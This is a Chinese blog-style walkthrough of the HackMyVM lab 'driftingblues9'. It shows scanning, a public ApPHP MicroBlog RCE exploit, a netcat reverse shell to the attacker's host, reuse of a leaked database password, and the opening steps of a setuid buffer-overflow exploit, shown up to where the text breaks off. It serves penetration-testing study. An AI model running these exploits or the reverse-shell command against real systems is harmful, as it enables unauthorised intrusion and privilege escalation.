---
title: driftingblues9
author: hgbe02
date: 2024-04-13
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,pwn]  
permalink: "/Hackmyvm/driftingblues9.html"
---

# driftingblues9

这个系列的最后一个靶机了，gogogo！！！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156941.png" alt="image-20240413182659546" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156942.png" alt="image-20240413183029623" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.6 -- -A
```

```text
Open 172.20.10.6:80
Open 172.20.10.6:111
Open 172.20.10.6:36168

PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-title: ApPHP MicroBlog
|_http-generator: ApPHP MicroBlog vCURRENT_VERSION
|_http-favicon: Unknown favicon MD5: 9252836E46BB0304BED26A5B96DF4DD4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36168/tcp   status
|   100024  1          38464/tcp6  status
|   100024  1          46499/udp6  status
|_  100024  1          49425/udp   status
36168/tcp open  status  syn-ack 1 (RPC #100024)
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,git,jpg,txt,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://172.20.10.6/images/]
/index.php            (Status: 200) [Size: 5650]
/docs                 (Status: 301) [Size: 309] [--> http://172.20.10.6/docs/]
/page                 (Status: 301) [Size: 309] [--> http://172.20.10.6/page/]
/header.php           (Status: 200) [Size: 13]
/admin                (Status: 301) [Size: 310] [--> http://172.20.10.6/admin/]
/footer.php           (Status: 500) [Size: 614]
/license              (Status: 301) [Size: 312] [--> http://172.20.10.6/license/]
/README.txt           (Status: 200) [Size: 975]
/js                   (Status: 301) [Size: 307] [--> http://172.20.10.6/js/]
/include              (Status: 301) [Size: 312] [--> http://172.20.10.6/include/]
/backup               (Status: 301) [Size: 311] [--> http://172.20.10.6/backup/]
/styles               (Status: 301) [Size: 311] [--> http://172.20.10.6/styles/]
/INSTALL.txt          (Status: 200) [Size: 1201]
/.php                 (Status: 403) [Size: 276]
/wysiwyg              (Status: 301) [Size: 312] [--> http://172.20.10.6/wysiwyg/]
/server-status        (Status: 403) [Size: 276]
/mails                (Status: 301) [Size: 310] [--> http://172.20.10.6/mails/]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.6
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.6
+ Target Hostname:    172.20.10.6
+ Target Port:        80
+ Start Time:         2024-04-13 06:33:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ /images/: Directory indexing found.
+ /docs/: Directory indexing found.
+ /styles/: Directory indexing found.
+ /INSTALL.txt: Default file found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/home.php: Admin login page/section found.
+ 8103 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2024-04-13 06:33:39 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156943.png" alt="image-20240413183101074" style="zoom:50%;" />

### 访问敏感目录

```apl
http://172.20.10.6/README.txt
```

```text
///////////////////////////////////////////////////////////////////////////////////
// 
// Advanced Power of PHP
// ---------------------
// http://www.apphp.com
// 
// ApPHP MicroBlog Free
//
// Version: 1.0.1
//
///////////////////////////////////////////////////////////////////////////////////

Thank you for using ApPHP.com software!
-----------------------------------------------------------------------------------
It's very easy to get started with ApPHP MicroBlog!!!
1. Installation:
   http://apphp.com/php-microblog/index.php?page=installation
2. Getting started:
   http://apphp.com/php-microblog/index.php?page=getting_started
If you have any troubles, find an example of code in the folder, named "examples" 
-----------------------------------------------------------------------------------
For more information visit: 
	site 	http://apphp.com/php-microblog/index.php?page=examples
	forum 	http://www.apphp.com/forum/
```

```apl
http://172.20.10.6/backup/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156944.png" alt="image-20240413183613778" style="zoom:50%;" />

```apl
http://172.20.10.6/wysiwyg/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156945.png" alt="image-20240413183808228" style="zoom:50%;" />

```apl
http://172.20.10.6/mails/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156947.png" alt="image-20240413183839346" style="zoom:50%;" />

```text
# http://172.20.10.6/mails/password_forgotten.txt
Hello _USER_NAME_!<br> <br>
You or someone else asked for your login info on our site, _WEB_SITE_
Your Login Info:
------------------------<br/>
Username: _USER_NAME_
Password: _USER_PASSWORD_
------------------<br/>
Best regards,
_WEB_SITE_
```

### 查找相关漏洞

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156948.png" alt="image-20240413184026723" style="zoom:50%;" />

有一个远程命令执行漏洞，尝试利用：

```bash
┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ searchsploit -m php/webapps/33070.py
  Exploit: ApPHP MicroBlog 1.0.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/33070
     Path: /usr/share/exploitdb/exploits/php/webapps/33070.py
    Codes: OSVDB-106352, OSVDB-106351
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/temp/driftingblues9/33070.py

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ python3 33070.py -h                                                                                            
  File "/home/kali/temp/driftingblues9/33070.py", line 14
    print "  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ python2 33070.py -h
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
Traceback (most recent call last):
  File "33070.py", line 38, in <module>
    r = urllib.urlopen(url)
  File "/usr/lib/python2.7/urllib.py", line 87, in urlopen
    return opener.open(url)
  File "/usr/lib/python2.7/urllib.py", line 215, in open
    return getattr(self, name)(url)
  File "/usr/lib/python2.7/urllib.py", line 471, in open_file
    return self.open_local_file(url)
  File "/usr/lib/python2.7/urllib.py", line 485, in open_local_file
    raise IOError(e.errno, e.strerror, e.filename)
IOError: [Errno 2] No such file or directory: "-h?j);echo(base64_decode('MTQyMGM2YWZhNjVjMTY5')=/"

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ python2 33070.py   
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
Usage: python 33070.py http://target/blog/index.php

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ python2 33070.py http://172.20.10.6 
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
        PHP Version 5.6.40-0+deb8u12
        System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
        Loaded Configuration File   /etc/php5/apache2/php.ini
        Apache Version   Apache/2.4.10 (Debian)
        User/Group   www-data(33)/33
        Server Root   /etc/apache2
        DOCUMENT_ROOT   /var/www/html
        PHP Version   5.6.40-0+deb8u12
        allow_url_fopen  On  On
        allow_url_include  Off  Off
        disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
        open_basedir   no value    no value
        System V Message based IPC   Wez Furlong
        System V Semaphores   Tom May
        System V Shared Memory   Christian Cartus

[*] Fetching include/base.inc.php
<?php
                        // DATABASE CONNECTION INFORMATION
                        define('DATABASE_HOST', 'localhost');           // Database host
                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database
                        ?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
> whoami
www-data

> nc -e /bin/bash 172.20.10.8 1234
```

执行成功！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156949.png" alt="image-20240413184330274" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@debian:/var/www/html$ ls -la
total 84
drwxr-xr-x 13 root root 4096 May  9  2021 .
drwxr-xr-x  3 root root 4096 May  9  2021 ..
-rw-r--r--  1 root root 1039 May 20  2009 .htaccess
-rw-r--r--  1 root root 1201 Jan 29  2014 INSTALL.txt
-rw-r--r--  1 root root  975 Jan 29  2014 README.txt
drwxr-xr-x  3 root root 4096 May  9  2021 admin
drwxr-xr-x  2 root root 4096 May  9  2021 backup
drwxr-xr-x  2 root root 4096 May  9  2021 docs
-rw-r--r--  1 root root 1191 Jan 29  2014 footer.php
-rw-r--r--  1 root root 1653 Nov 15  2009 header.php
drwxr-xr-x  4 root root 4096 May  9  2021 images
drwxrwxrwx  3 root root 4096 May  9  2021 include
-rw-r--r--  1 root root 6409 Mar 10  2014 index.php
drwxr-xr-x  2 root root 4096 May  9  2021 js
drwxr-xr-x  2 root root 4096 May  9  2021 license
drwxr-xr-x  2 root root 4096 May  9  2021 mails
drwxr-xr-x  2 root root 4096 May  9  2021 page
-rw-r--r--  1 root root 1728 Feb  3  2014 rss.xml
drwxr-xr-x  4 root root 4096 May  9  2021 styles
drwxr-xr-x  8 root root 4096 May  9  2021 wysiwyg
(remote) www-data@debian:/var/www/html$ sudo -l
bash: sudo: command not found
(remote) www-data@debian:/var/www/html$ cd /home
(remote) www-data@debian:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 May  9  2021 .
drwxr-xr-x 21 root    root    4096 May  9  2021 ..
dr-x------  2 clapton clapton 4096 May  9  2021 clapton
(remote) www-data@debian:/home$ cd clapton/
bash: cd: clapton/: Permission denied
(remote) www-data@debian:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
messagebus:x:106:112::/var/run/dbus:/bin/false
mysql:x:107:114:MySQL Server,,,:/var/lib/mysql:/bin/false
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
(remote) www-data@debian:/home$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
(remote) www-data@debian:/home$ su clapton       
Password: 
su: Authentication failure
(remote) www-data@debian:/home$ su root
Password: 
su: Authentication failure
(remote) www-data@debian:/home$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
........
(remote) www-data@debian:/var/www/html/include$ cat base.inc.php 
<?php
                        // DATABASE CONNECTION INFORMATION
                        define('DATABASE_HOST', 'localhost');           // Database host
                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database
                        ?>
```

找到密码了，尝试进行登录：

```apl
clapton
yaraklitepe
```

### 切换用户

```bash
(remote) www-data@debian:/var/www/html/include$ su clapton
Password: 
clapton@debian:/var/www/html/include$ cd /home clapton
clapton@debian:/home$ 
(local) pwncat$                                                                                                                                         
(remote) clapton@debian:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 May  9  2021 .
drwxr-xr-x 21 root    root    4096 May  9  2021 ..
dr-x------  2 clapton clapton 4096 May  9  2021 clapton
(remote) clapton@debian:/home$ cd clapton/
(remote) clapton@debian:/home/clapton$ ls -la
total 24
dr-x------ 2 clapton clapton 4096 May  9  2021 .
drwxr-xr-x 3 root    root    4096 May  9  2021 ..
-rwsr-xr-x 1 root    root    5150 Sep 22  2015 input
-rwxr-xr-x 1 root    root     201 May  9  2021 note.txt
-rw-r--r-- 1 clapton clapton   32 May  9  2021 user.txt
(remote) clapton@debian:/home/clapton$ cat note.txt
buffer overflow is the way. ( ͡° ͜ʖ ͡°)

if you're new on 32bit bof then check these:

https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
https://samsclass.info/127/proj/lbuf1.htm
  
  
(remote) clapton@debian:/home/clapton$ cat user.txt 
F569AA95FAFF65E7A290AB9ED031E04F(remote) clapton@debian:/home/clapton$ sudo -l
bash: sudo: command not found
(remote) clapton@debian:/home/clapton$ cd input 
bash: cd: input: Not a directory
(remote) clapton@debian:/home/clapton$ file input 
input: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped
(remote) clapton@debian:/home/clapton$ 
(local) pwncat$ lpwd
/home/kali/temp/driftingblues9
(local) pwncat$ download input
input ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 5.2/5.2 KB • ? • 0:00:00[06:56:26] downloaded 5.15KiB in 0.11 seconds
```

### 分析程序

```bash
┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ file input 
input: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ checksec input 
Error: No option selected. Please select an option.

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ checksec --file=input
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               2               input
```

ida 打开看一下：

```bash
# main.c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [esp+11h] [ebp-9Fh]

  if ( argc <= 1 )
  {
    printf("Syntax: %s <input string>\n", *argv);
    exit(0);
  }
  strcpy(&dest, argv[1]);
  return 0;
}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404132156950.png" alt="image-20240413204108420" style="zoom:50%;" />

`strcpy`是一个比较脆弱的函数，应该是在这里进行溢出，先运行一下：

```bash
(remote) clapton@debian:/home/clapton$ ./input flag
(remote) clapton@debian:/home/clapton$ ./input 1234
(remote) clapton@debian:/home/clapton$ ./input admin
```

没有回显。。。进行测试：

```bash
(remote) clapton@debian:/home/clapton$ ./input aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```

说明可以进行溢出。

#### 检查ALSR

```bash
(remote) clapton@debian:/home/clapton$ cat /proc/sys/kernel/randomize_va_space
2
```

说明启用了。。。

#### 生成测试字符

```bash
┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─$ locate pattern_create                                                        
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb

┌──(kali💀kali)-[~/temp/driftingblues9]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

#### 测试

```bash
┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─# gdb ./input                                        
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./input...
(No debugging symbols found in ./input)
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Starting program: /home/kali/temp/driftingblues9/input Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41376641 in ?? ()
```

#### 计算溢出长度

```bash
┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─# locate pattern_offset
/usr/bin/msf-pattern_offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41376641
[*] Exact match at offset 171
```

#### 验证

```bash
┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─# python                     
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(171*"A"+"B"*4+80*"D")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```

```bash
┌──(root㉿kali)-[/home/kali/temp/driftingblues9]
└─# gdb ./input
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./input...
(No debugging symbols found in ./input)
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
